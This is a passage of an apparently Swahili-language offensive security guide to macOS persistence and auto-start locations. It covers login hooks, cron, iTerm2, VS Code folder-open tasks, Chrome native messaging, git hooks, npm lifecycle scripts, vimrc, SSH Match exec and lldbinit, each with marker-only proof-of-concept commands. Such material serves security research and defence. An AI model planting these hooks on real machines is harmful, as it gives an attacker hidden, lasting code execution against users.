- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Maelezo na Unyonyaji

QuickLook plugins zinaweza kutekelezwa unapo **anzisha onyesho la awali la faili** (bonyeza space bar faili ikiwa imechaguliwa katika Finder) na **plugin inayotumia aina hiyo ya faili** ikiwa imesakinishwa.<sup>[[8]](#references)</sup>

Unaweza kukompaila QuickLook plugin yako mwenyewe, kuiweka katika mojawapo ya maeneo yaliyotajwa awali ili ipakie, kisha uende kwenye faili inayotumika na ubonyeze space ili kuianzisha.

Njia hizi zinarejelea bundles za zamani za `.qlgenerator`; [mwongozo wa Apple kuhusu usanifu wa Quick Look](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) unaeleza mpangilio wa utafutaji na aina za faili zinazolingana. Quick Look **app extensions** za sasa huwekwa pamoja na app na zina kanuni tofauti za usajili na utekelezaji. Kuwepo kwa generator hakuthibitishi kwamba itachaguliwa kwa aina hiyo au kwamba msimbo wake utaendeshwa ndani ya Finder yenyewe. Njia ya legacy generator ilikaguliwa kupitia nyaraka na uwepo wa saraka; hakuna generator iliyosakinishwa au kupakiwa kwenye Mac ya utafiti.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Hili halikunifanyia kazi, iwe kwa user LoginHook au root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Inafaa kwa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Unahitaji kuwa na uwezo wa kutekeleza kitu kama `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - `Ili`yopo katika `~/Library/Preferences/com.apple.loginwindow.plist`

Zimepitwa na wakati lakini zinaweza kutumika kutekeleza amri mtumiaji anapoingia.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Mpangilio huu huhifadhiwa katika /Users/$USER/Library/Preferences/com.apple.loginwindow.plist.

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Ili kuifuta:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Ile ya mtumiaji root imehifadhiwa kwenye **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Kukwepa Sandbox kwa Masharti

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **sandbox bypass** yanayokuruhusu kutekeleza kitu kwa urahisi kwa **kukikiandika kwenye faili** na **kutegemea hali zisizo za kawaida sana**, kama vile **programu maalum zilizosakinishwa,** vitendo au mazingira ya mtumiaji **“asiyetumika sana”**.

### Cron

**Maelezo**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Inafaa kwa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Hata hivyo, unahitaji kuweza kutekeleza binary ya `crontab`
  - Au uwe root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/usr/lib/cron/tabs/`**
  - Root inahitajika ili kuandika moja kwa moja. Root haihitajiki ikiwa unaweza kutekeleza `crontab <file>`
  - **Kichochezi**: Ratiba iliyo kwenye crontab iliyosakinishwa. `at` na `periodic` ni mbinu tofauti zilizo hapa chini.

#### Maelezo na Unyonyaji

Orodhesha kazi za cron za **mtumiaji wa sasa** kwa kutumia:

```bash
crontab -l
```

Faili ya plist ya launchd ya daemon ya cron ya mfumo ina ingizo la `QueueDirectories` la `/usr/lib/cron/tabs`; hapo ndipo crontab za watumiaji zilizosakinishwa huhifadhiwa. Kukagua crontab za watumiaji wengine kunahitaji root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

Katika akaunti ya majaribio ya muda, ingizo la cron la mtumiaji lenye marker pekee linaweza kusakinishwa kwa kutumia `crontab` na kuondolewa baada ya kulichunguza. Kutumia `crontab <file>` **hubadilisha crontab yote iliyopo ya akaunti**, kwa hivyo ihifadhi na uirejeshe ikiwa akaunti hiyo si ya majaribio ya muda:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Maelezo: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 iliwahi kuwa na ruhusa za TCC

#### Mahali

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Kichochezi**: Anzisha iTerm2 ikiwa na script inayostahiki ya Python API kwenye folda hiyo
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Kichochezi**: Anzisha iTerm2; AppleScript startup hook imeandikwa kwenye nyaraka tofauti
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Kichochezi**: Unda session kwa kutumia profile ambayo command au initial text yake huanzisha payload

#### Maelezo na Exploitation

[Python API guide ya sasa ya iTerm2](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) inaeleza jinsi ya kutumia script za **Python** zinazojiendesha kiotomatiki katika `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Haithibitishi kuwa faili yoyote ya `.sh` inayoweza kutekelezwa kwenye folda hiyo itaendeshwa. Kwa akaunti ya majaribio, hifadhi hii kama `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

Mwongozo wa sasa wa AppleScript wa [iTerm2](https://iterm2.com/documentation-scripting.html) unaeleza kando kuhusu `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, pamoja na njia mbadala ya zamani `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` wakati folda ya kisasa haipo. AppleScript yenye marker pekee ni:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Mifano hii ya script ilikaguliwa kwa kutumia nyaraka za iTerm2, lakini haikuendeshwa katika kipindi amilifu cha desktop. Baada ya kuijaribu katika akaunti ya majaribio inayoweza kutupwa, ondoa script ya majaribio na `/tmp/ht-iterm-autolaunch-marker` au `/tmp/iterm2-autolaunchscpt`, mtawalia.

Mipangilio ya iTerm2 iliyo katika **`~/Library/Preferences/com.googlecode.iterm2.plist`** inaweza kubainisha amri ya profile au maandishi ya awali. Maandishi hayo huingizwa kwenye session; utekelezaji hutegemea shell kuyachakata. [Nyaraka za profile za iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) zinaeleza amri inayoendeshwa session mpya yenye profile hiyo inapoundwa.

Mpangilio huu unaweza kusanidiwa katika mipangilio ya iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Na amri hiyo huonyeshwa katika mipangilio:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Kwa tathmini salama, kagua profile iliyochaguliwa katika mipangilio ya iTerm2 au usome nakala ya faili yake ya mapendeleo. Kubadilisha `Initial Text` katika profile inayotumika kunaweza kuathiri vipindi vya mtumiaji, kwa hiyo hakuna mapendeleo yaliyobadilishwa kwenye Mac ya utafiti.

### xbar

Maelezo: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Inafaa kwa bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini xbar lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Huomba ruhusa za Accessibility

#### Mahali

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Kichochezi**: xbar inapoendeshwa

#### Maelezo

Ikiwa programu maarufu [**xbar**](https://github.com/matryer/xbar) imesakinishwa, inawezekana kuandika shell script katika **`~/Library/Application\ Support/xbar/plugins/`** ambayo itaendeshwa xbar inapoanzishwa:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Ni muhimu kwa bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini Hammerspoon lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Inaomba ruhusa za Accessibility

#### Mahali

- **`~/.hammerspoon/init.lua`**
  - **Kichochezi**: Mara tu hammerspoon inapotekelezwa

#### Maelezo

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) hutumika kama jukwaa la automation la **macOS**, likitumia **lugha ya uandishi ya LUA** kwa shughuli zake. Hasa, inasaidia kuunganisha msimbo kamili wa AppleScript na kutekeleza shell scripts, na hivyo kupanua kwa kiasi kikubwa uwezo wake wa uandishi.<sup>[[13]](#references)</sup>

Programu hutafuta faili moja, `~/.hammerspoon/init.lua`, na script hiyo hutekelezwa inapoanzishwa.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Ni muhimu kwa bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini BetterTouchTool lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Huomba ruhusa za Automation-Shortcuts na Accessibility

#### Mahali

- Faili ya script **ambayo tayari imerejelewa** na preset ya BetterTouchTool iliyowezeshwa, au usanidi wa preset hiyo chini ya `~/Library/Application Support/BetterTouchTool/`. Njia kamili ya script inategemea jinsi preset ilivyosaniwa.

[Rejeleo la vitendo vya BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) linaeleza vitendo vya shell-script na background-command. Tukio la kibodi, kipanya, touch, widget au tukio jingine lililosanidiwa lazima litokee wakati preset husika inatumika; [mwongozo wake wa vichochezi](https://docs.folivora.ai/docs/configuration/new-trigger/) unaonyesha jinsi vinavyounganishwa. Faili ya kawaida tu kwenye saraka ya application-support si kichochezi. Kitendo kilichosanidiwa tayari kinachopakia script ya nje inayoweza kuandikwa ni lengo finyu zaidi la write-to-execution. Code huendeshwa kwa akaunti ya mtumiaji wa BetterTouchTool, kulingana na ruhusa halisi alizopewa kwenye macOS. BetterTouchTool haikuwepo ndani ya `/Applications` kwenye Mac ya utafiti, kwa hiyo hakuna preset iliyobadilishwa au kuendeshwa hapa.

### Alfred

- Ni muhimu kwa bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini Alfred lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Huomba ruhusa za Automation, Accessibility na hata Full-Disk access

#### Mahali

- Script au faili **ambayo tayari imerejelewa** na workflow ya Alfred iliyosakinishwa, au workflow hiyo ndani ya saraka ya `Alfred.alfredpreferences` iliyosanidiwa na mtumiaji. Saraka ya preferences inaweza kusawazishwa na si njia moja maalum inayotumika kila mahali.

[Mwongozo wa workflow za Alfred](https://www.alfredapp.com/help/workflows/) unaeleza sharti la Powerpack na usakinishaji kupitia UI yake. Kichochezi cha hotkey, keyword au kichochezi kingine kilichosanidiwa cha workflow iliyosakinishwa lazima kiwashe; [mfano wa hotkey wa Alfred](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) unaonyesha kitendo cha script. [Rejeleo la mazingira la Alfred](https://www.alfredapp.com/help/workflows/script-environment-variables/) linaonyesha njia ya preferences iliyochaguliwa kama `alfred_preferences`. Kuweka faili ya workflow ambayo haijasajiliwa kwenye saraka yoyote hakuthibitishi kwamba itasakinishwa au kuendeshwa. Code huendeshwa kama mtumiaji aliyeingia kwenye Alfred, kwa ruhusa halisi alizopewa kwenye macOS. Alfred haikuwepo ndani ya `/Applications` kwenye Mac ya utafiti, kwa hiyo njia hii ilitathminiwa kwa kutumia nyaraka pekee.

### Raycast Script Commands na kuonyesha upya extension

- **Lengo la kuandikia:** Script inayoweza kutekelezwa kwenye saraka **ambayo tayari imeongezwa** chini ya Raycast Settings → Script Commands. Raycast haichanganui saraka yoyote mpya iliyoundwa kiholela. [Mwongozo wa Script Commands wa Raycast](https://manual.raycast.com/script-commands) unaeleza usajili wa saraka.
- **Kichochezi na utambulisho:** Mtumiaji huendesha command iliyo kwenye faharasa, hotkey iliyosanidiwa au fallback huiendesha, au Raycast huonyesha upya script ya `inline` kulingana na `@raycast.refreshTime` yake iliyosanidiwa. Script huendeshwa na interpreter yake kama mtumiaji aliyeingia kwenye Raycast. [Rejeleo la metadata la upstream](https://github.com/raycast/script-commands#metadata) linawekea kikomo uonyeshaji upya wa kiotomatiki kwa commands za inline, na [manifest ya extension ya Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) inaunga mkono kivyake `interval` kwa commands za extension ya `no-view` au `menu-bar` zilizosakinishwa. Kuongeza tu script command ya kawaida hakuipangii muda wa kuendeshwa.

Kwa akaunti ya muda yenye saraka ya script iliyosajiliwa, script ya inline inayoweka alama pekee ni:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Ihifadhi kwenye saraka iliyosajiliwa, ifanye iweze kutekelezwa, na uruhusu Raycast iisasishe. Kisha futa faili hiyo na `/tmp/ht-raycast-refresh-marker`. Raycast haikupatikana chini ya jina lake la kawaida la `/Applications` kwenye Mac ya utafiti, kwa hivyo maelezo haya yanategemea nyaraka na hayakujaribiwa kwenye kifaa hicho. Ruhusa za Accessibility, Automation na faili bado zinategemea maombi ya ruhusa ya macOS.

### Majukumu ya kiotomatiki ya workspace katika Visual Studio Code

- **Andika kwenye:** `.vscode/tasks.json` ndani ya workspace ambayo mtumiaji atafungua.
- **Kichochezi:** Kufungua workspace hiyo katika VS Code, lakini tu ikiwa folda inaaminika **na** majukumu ya kiotomatiki yameruhusiwa. Workspace isiyoaminika haiendeshi kamwe majukumu ya kiotomatiki; mpangilio chaguomsingi humwuliza mtumiaji kabla ya uendeshaji wa kwanza wa kiotomatiki. [VS Code task documentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) na [Workspace Trust documentation](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) zinaeleza masharti hayo yote mawili.
- **Utambulisho wa utekelezaji:** Akaunti ya mtumiaji wa VS Code, kupitia mchakato wa task uliosanidiwa. Huu ni utekelezaji mahususi wa programu, si persistence ya kuingia.

Katika **workspace mpya ya majaribio inayoweza kutupwa**, weka task hii ya marker pekee kwenye `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Baada ya kufungua workspace inayoaminika na kuruhusu tasks za kiotomatiki, angalia `.autostart-task-ran`. Ondoa ingizo la task na alama hiyo ili kusafisha. **Hili lilithibitishwa dhidi ya nyaraka za Microsoft na kifurushi cha VS Code 1.139.1 kilichosakinishwa; halikuendeshwa katika kipindi amilifu cha desktop.**

### Chrome native messaging hosts

- **Lengo la kuandikia:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` kwa mtumiaji wa sasa, au `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` kwa watumiaji wote (ruhusa za admin zinahitajika za kuandika). Chromium na Chrome for Testing hutumia saraka tofauti; tazama [jedwali la sasa la njia za Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Kichochezi:** Kiendelezi cha Chrome kilichosakinishwa chenye ruhusa ya `nativeMessaging` huita `chrome.runtime.connectNative()` au `chrome.runtime.sendNativeMessage()` kwa kutumia jina kamili la host kutoka kwenye manifest. Chrome kisha huwasha executable ya host. Kufungua Chrome pekee hakutekelezi host mpya ya native kiholela; kuunda manifest bila kiendelezi kinachoiita hakufanyi chochote. [Mwongozo wa native messaging wa Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) unaeleza mawasiliano haya.
- **Utambulisho wa utekelezaji:** Akaunti ya mtumiaji wa Chrome. Manifest lazima itaje njia kamili ya executable na iruhusu wazi origin ya kiendelezi kinachoiita.

Katika akaunti ya kivinjari ya majaribio inayoweza kutupwa, yenye kiendelezi cha majaribio, jozi ifuatayo ya faili inaonyesha uhusiano kati ya kuandika na kutekeleza. Jina la faili la manifest lazima lilingane na `name` yake, na `TEST_EXTENSION_ID` lazima ibadilishwe na ID halisi ya kiendelezi hicho:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Hifadhi JSON hii kama `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Kitekelezi cha marker-only kilicho kwenye `path` ya manifest kinaweza kuwa na:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Baada ya extension ya majaribio kuita `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` kutoka kwenye service worker au ukurasa wa extension, alama hiyo huthibitisha kuwa host imeanza. Host hii ndogo haitekelezi protocol ya majibu ya Chrome yenye urefu uliotangulizwa, kwa hiyo extension inaweza kuripoti hitilafu ya ujumbe baada ya alama kuandikwa. Ondoa manifest ya majaribio, host na alama ili kufanya usafi. Kwenye macOS 26.5.2, app ya Chrome na saraka zote mbili za manifest zilikuwepo; **profile hai ya Chrome haikubadilishwa wala kutumika**.

### Amri za matukio ya vitufe za Karabiner-Elements

- **Lengo la uandishi:** `~/.config/karabiner/karabiner.json` katika akaunti ambayo Karabiner-Elements imesakinishwa na inaendeshwa. [Mwongozo wa Karabiner kuhusu mahali pa faili](https://karabiner-elements.pqrs.org/docs/json/location/) unasema kwamba app hufuatilia na kupakia upya faili hii baada ya kuandikwa. Faili za JSON katika `assets/complex_modifications` ni mipangilio wezeshi inayoweza kuingizwa tu; kuandika faili hapo pekee hakuwezeshi kanuni.
- **Kichochezi:** Tukio la kitufe lililosanidiwa baada ya kanuni kuanza kutumika. [Rejeleo la `to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) linaeleza utekelezaji wa amri. Huu si utekelezaji wa msimbo wakati wa kuingia au kila faili inapoandikwa.
- **Utambulisho wa utekelezaji:** Mtumiaji aliyeingia anayendesha mchakato wa mtumiaji wa Karabiner. Ruhusa zake na ufikiaji wowote wa TCC hutegemea app na toleo lake.

Kwa akaunti ya majaribio inayoweza kutupwa, ongeza kifaa hiki cha kanuni kwenye safu ya `complex_modifications.rules` ya profile iliyochaguliwa katika `karabiner.json`, huku ukihifadhi sehemu nyingine za profile hiyo. Bonyeza F18 ili kuunda alama isiyo na madhara, kisha ondoa kanuni hii na alama hiyo. Kuchagua F18 huepusha kubadilisha kitufe cha kawaida cha kuandika:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements haikusakinishwa katika `/Applications` kwenye mashine ya majaribio ya macOS 26.5.2, kwa hiyo hii ni PoC inayotegemea nyaraka, badala ya matokeo ya utekelezaji wa ndani.

### Git hooks katika hazina ya ndani

- **Lengo la kuandikia:** Hook inayoweza kutekelezwa kama `<repo>/.git/hooks/post-checkout`. Ikiwa `core.hooksPath` tayari imewekwa, tumia saraka hiyo iliyosanidiwa. Hook iliyowekwa kwenye hazina kama faili ya kawaida inayofuatiliwa haijasakinishwa kiotomatiki kwenye clone.
- **Kichochezi:** Operesheni inayolingana ya Git. Kwa mfano, `post-checkout` huendeshwa baada ya `git checkout` au `git switch`, na inaweza pia kuendeshwa baada ya kuunda clone au worktree. [Marejeleo ya hooks ya Git](https://git-scm.com/docs/githooks) yanaorodhesha matukio na sharti la ruhusa ya kutekeleza; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) hubadilisha saraka inayotafutwa.
- **Utambulisho wa utekelezaji:** Akaunti inayoendesha Git. Hook inaweza kutekelezwa tu ikiwa saraka ya hooks inayotumika kwa hazina inaweza kuandikiwa na mtendaji, na mtumiaji baadaye anafanya operesheni husika ya Git.

PoC hii ya alama pekee huunda hazina inayoweza kutupwa kabisa, husakinisha hook moja, kisha hubadilisha tawi. Ilitekelezwa kwa mafanikio kwa kutumia Apple Git 2.50.1 kwenye macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm lifecycle scripts katika mradi

- **Lengo la uandishi:** Ramani ya `scripts` katika `package.json` ya mradi unaoweza kuandikwa, au kifurushi cha dependency kilichosakinishwa ambacho lifecycle script yake mtumiaji ataendesha. Hii ni hook ya mtiririko wa kazi ya uendelezaji, si utekelezaji unaotokana na kufungua directory.
- **Kichochezi na utambulisho:** Baadaye, `npm install` au `npm ci` ikiendeshwa huku lifecycle scripts zikiruhusiwa, huendesha `preinstall`, `install`, na `postinstall` kwa utambulisho wa mtumiaji anayeendesha npm. `npm run <name>` ya kawaida pia huendesha scripts zinazolingana za `pre<name>` na `post<name>`. [Rejeleo la lifecycle la npm](https://docs.npmjs.com/cli/v11/using-npm/scripts) linaorodhesha matukio; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) inaweza kuzuia install lifecycle scripts. Mipangilio ya toleo na sera inaweza kubadilisha kinachoruhusiwa, kwa hiyo angalia toleo la npm lengwa.

PoC hii ya marker-only iliendeshwa kwa npm ya ndani kwenye directory tupu inayoweza kutupwa. Haipakui dependencies wala kubadilisha mradi wa mtumiaji:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Hii ni tofauti na faili za kuanzisha interpreter ya Python: npm lazima itekeleze kitendo husika cha usakinishaji au uendeshaji, ilhali msimbo wa Python `site` unaweza kupakiwa wakati wa kuendesha interpreter kwa kawaida. Malengo ya jumla ya `Makefile` na ufafanuzi wa kazi za build vilevile huhitaji mtumiaji au zana iliyosanidiwa awali iitishe lengo hilo; si njia tofauti za OS za kuanzisha kiotomatiki.

### Usanidi wa kuanzisha Vim

- **Lengo la kuandikia:** `~/.vimrc` kwa mtumiaji atakayeanzisha Vim (au faili nyingine ya kuanzisha iliyochaguliwa kulingana na mpangilio wa uanzishaji wa Vim). [Marejeleo ya uanzishaji wa Vim](https://vimhelp.org/starting.txt.html) yanaeleza faili hii na mipangilio mbadala ya `VIMINIT`/`EXINIT`.
- **Kichochezi:** Uanzishaji wa kawaida wa Vim unaofuata, ambao hupakia usanidi huu. Chaguo la Vim `-u NONE` huruka vimrc ya mtumiaji. Huu ni utekelezaji mahususi kwa editor, si kichochezi cha kuingia kwenye OS.
- **Utambulisho wa utekelezaji:** Akaunti ya mtumiaji wa Vim.

PoC ifuatayo iliyotengwa iliendeshwa dhidi ya macOS `/usr/bin/vim`; haiandiki mapendeleo halisi ya Vim wala hati zilizo wazi:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim ina njia tofauti ya usanidi wa mtumiaji, `$XDG_CONFIG_HOME/nvim/init.lua` au `init.vim`, na pia hupakia scripts katika saraka zake za runtime za `plugin/` kulingana na [hati za uanzishaji](https://neovim.io/doc/user/starting/). Neovim haikuwa imesakinishwa kwenye mashine ya majaribio ya macOS 26.5.2, kwa hivyo toleo hili halikujaribiwa hapo.

### Amri za usanidi wa mteja wa SSH

- **Lengo la kuandika:** `~/.ssh/config`, au faili nyingine ambayo tayari imejumuishwa ndani yake. Hii ni faili ya usanidi wa **mteja**; ni tofauti na faili ya upande wa seva `~/.ssh/rc` iliyoelezwa hapa chini.
- **Kichochezi:** Utekelezaji wa `ssh` unaolingana. `Match exec` huendesha amri ya ndani wakati mteja anatathmini usanidi wake, hata kwa `ssh -G`, ambayo huonyesha usanidi bila kuunganisha. `ProxyCommand` huendeshwa mteja anapoanzisha muunganisho unaolingana. `LocalCommand` huendeshwa tu baada ya muunganisho kufanikiwa na huhitaji `PermitLocalCommand yes` (chaguo-msingi ni `no`). Hizi hutofautiana kwa muda wa utekelezaji na masharti ya awali; kuandika faili pekee hakuzitekelezi. Tazama [OpenSSH `ssh_config(5)` ya upstream](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Utambulisho wa utekelezaji:** Mtumiaji wa ndani anayeendesha `ssh`. Lazima kuwe na host inayolingana, faili ya usanidi inayotumika, na muunganisho wowote unaohitajika. `ssh -F` inaweza kuchagua faili tofauti ya usanidi.

PoC hii ya alama pekee iliendeshwa kwa mteja wa SSH wa Apple kwenye macOS 26.5.2. `-G` hujaribu `Match exec` bila kuanzisha muunganisho wa mtandao au kusoma usanidi halisi wa SSH wa mtumiaji:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Faili za uanzishaji wa Debugger

- **Lengo la kuandikia:** `~/.lldbinit` au faili mahususi ya programu yenye kipaumbele cha juu, kama vile `~/.lldbinit-lldb`. LLDB husoma faili moja wakati debugger inapoanza. `.lldbinit` iliyo kwenye saraka ya sasa **haitatekelezwa** kwa chaguo-msingi; mtumiaji lazima awashe `target.load-cwd-lldbinit` au apitishe `--local-lldbinit`. Tazama [mwongozo wa LLDB](https://lldb.llvm.org/man/lldb.html).
- **Kichochezi na utambulisho:** Mtumiaji anaanzisha LLDB bila `--no-lldbinit`; amri huendeshwa kama mtumiaji huyo. Kufungua tu mradi hakumaanishi kuwa `.lldbinit` ya mradi itaendeshwa.

Jaribio lifuatalo la marker pekee liliendeshwa kwenye LLDB kwenye macOS 26.5.2, likitumia saraka ya nyumbani na saraka ya kufanya kazi zilizotengwa:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**, [nyaraka za kuanzisha za upstream](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) zinaorodhesha `$HOME/Library/Preferences/gdb/gdbinit` na kisha `~/.gdbinit` kwenye macOS. `.gdbinit` ya saraka ya sasa inategemea [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), na `-nx`/`-nh` huzuia faili za uanzishaji. GDB haikuwa imesakinishwa kwenye Mac ya majaribio, kwa hiyo toleo hili halikujaribiwa hapa.

### SSHRC

Maelezo: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini ssh lazima iwezeshwe na itumike
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
